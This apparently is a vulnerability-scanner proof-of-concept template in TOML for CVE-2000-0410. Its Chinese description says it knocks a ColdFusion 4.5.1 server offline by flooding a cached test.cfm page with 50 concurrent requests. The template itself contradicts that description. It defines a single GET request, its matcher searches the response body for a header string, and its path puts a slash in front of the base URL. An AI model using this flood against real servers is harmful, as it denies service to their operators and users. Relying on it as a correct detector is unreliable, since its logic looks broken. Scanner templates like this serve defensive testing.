[info]
author = "ave"
description = "通过发送大量重复请求访问 ColdFusion Server 4.5.1 上使用 CFCACHE 标记的缓存页面（如 test.cfm），耗尽服务器资源导致拒绝服务。发送 50 次并发请求后检测响应延迟或连接重置。"
id = "POC-AVE-2000-0439"
name = "CVE-2000-0410 PoC"
severity = "medium"
tags = ["ave-2000-0439"]
vuln_id = [
    "CVE-2000-0410",
    "AVE-2000-0439",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/test.cfm"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Connection: close",
    "500",
    "Service Unavailable",
]
